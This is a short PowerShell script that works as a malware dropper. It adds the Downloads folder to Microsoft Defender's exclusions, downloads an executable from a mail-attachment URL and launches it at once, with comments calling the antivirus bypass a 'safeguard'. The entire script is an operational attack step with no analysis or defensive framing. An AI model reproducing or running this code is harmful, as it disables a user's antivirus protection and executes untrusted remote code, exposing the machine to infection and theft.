Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
$url = 'https://webattach.mail.yandex.net/message_part_real/?sid=YWVzX3NpZDp7ImFlc0tleUlkIjoiMTc4IiwiaG1hY0tleUlkIjoiMTc4IiwiaXZCYXNlNjQiOiJxekZ4NVNDMlJIUnJVRlQyYUw3dnN3PT0iLCJzaWRCYXNlNjQiOiI3akpaa2RXNVovMHExK25hUkI0dmdaOUI1RkVYY0MwSHU1L0dhQmFSOWMvUkZqaVVVdWpCM0x6bEJCaU9OY3dMcjhYOFhId1hqSFc2eThBeU9TRmpiUmo1ZE5aZTcvLzYxQTNFRGJnSFBhazR4clIvczRjbVM1RytKTytGZXlNbSIsImhtYWNCYXNlNjQiOiJwaG1KMVBUMk9hbFQvWlRiNytEYWw3MkZnK1NXUEdaOWRZckIzYXhjcTdrPSJ9&name=rrr.exe'
$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'NAME.exe')

# Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
Start-Sleep -Milliseconds 100 

# Download the file
Invoke-WebRequest -Uri $url -OutFile $outputFile

# Run the downloaded file after the download is complete
Start-Process -FilePath $outputFile
